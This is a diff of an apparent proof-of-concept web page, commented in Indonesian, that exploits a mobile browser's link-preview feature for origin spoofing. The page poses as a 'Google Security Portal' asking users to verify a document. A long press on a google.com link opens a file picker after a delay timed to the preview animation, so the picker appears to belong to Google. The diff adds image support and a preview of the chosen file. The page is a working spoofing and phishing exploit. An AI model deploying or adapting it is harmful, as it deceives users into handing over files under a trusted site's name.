@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Security PoC - File Picker Origin Spoofing</title>
+    <title>Advanced Security PoC - File Picker & Image Preview</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -13,7 +13,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
             padding: 20px;
             text-align: center;
@@ -45,6 +45,22 @@
         a.spoof-link:active {
             background-color: #1557b0;
         }
+        .preview-container {
+            margin-top: 25px;
+            max-width: 300px;
+            display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .file-info {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
+        }
         .footer-note {
             margin-top: 30px;
             font-size: 12px;
@@ -57,8 +73,15 @@
     <div class="banner">Google Security Portal</div>
     <h1>Verifikasi Dokumen Pengguna</h1>
 
-    <!-- Tautan target untuk memicu Preview Page -->
-<a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>
+    <!-- Tautan target murni untuk memicu Preview Page -->
+    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>
+
+    <!-- Area Pratinjau Gambar yang Diunggah -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="Pratinjau Berkas">
+        <div class="file-info" id="fileInfo"></div>
+    </div>
+
     <div class="footer-note">Sistem verifikasi aman berbasis cloud.</div>
 
     <script>
@@ -69,27 +92,49 @@
             if (triggered) return;
             triggered = true;
 
-            // Timer disesuaikan untuk menunggu transisi animasi panel preview terbuka
+            // Timer dioptimalkan agar pas dengan durasi animasi preview page terbuka
             setTimeout(async () => {
                 try {
-                    await window.showOpenFilePicker({
+                    // Mengubah tipe penerimaan agar mendukung gambar untuk preview
+                    const [fileHandle] = await window.showOpenFilePicker({
                         multiple: false,
                         types: [{
-                            description: 'Dokumen Verifikasi Resmi (.pdf)',
-                            accept: { 'application/pdf': ['.pdf'] }
+                            description: 'Gambar & Dokumen',
+                            accept: { 
+                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                'application/pdf': ['.pdf']
+                            }
                         }]
                     });
+
+                    // Mengambil data file yang dipilih pengguna
+                    const file = await fileHandle.getFile();
+                    
+                    // Menampilkan informasi nama file
+                    const fileInfo = document.getElementById("fileInfo");
+                    fileInfo.innerText = `File terpilih: ${file.name}`;
+
+                    // Jika file berupa gambar, tampilkan pratinjaunya di halaman
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    
+                    if (file.type.startsWith('image/')) {
+                        imagePreview.src = URL.createObjectURL(file);
+                        previewBox.style.display = "block";
+                    } else {
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
+
                 } catch (err) {
-                    // Menangkap error pembatalan atau jika patch keamanan browser sudah aktif
-                    console.debug("Aksi file picker dihentikan atau diblokir:", err.message);
+                    console.debug("Aksi file picker dihentikan:", err.message);
                 } finally {
-                    // Reset status agar dapat diuji kembali jika diperlukan
                     setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 1700); // Waktu optimal jeda milidetik untuk membuka ephemeral tab
+            }, 1700); // 1.7 detik waktu tunggu optimal untuk ephemeral tab
         };
 
-        // Menggunakan multi-event listener untuk memperkuat pemicu interaksi seluler
+        // Event listener untuk menangkap gestur konteks menu (long press)
         const targetElement = document.getElementById("targetLink");
 
         targetElement.addEventListener("contextmenu", (e) => {
@@ -97,8 +142,7 @@
         });
 
         targetElement.addEventListener("touchstart", (e) => {
-            // Membantu menangkap awal gestur sentuh tahan lama (long-press)
-            // Tanpa menghentikan fungsi bawaan browser agar preview tetap muncul
+            // Membantu mendeteksi interaksi sentuh awal pada perangkat seluler
         }, { passive: true });
     </script>
 
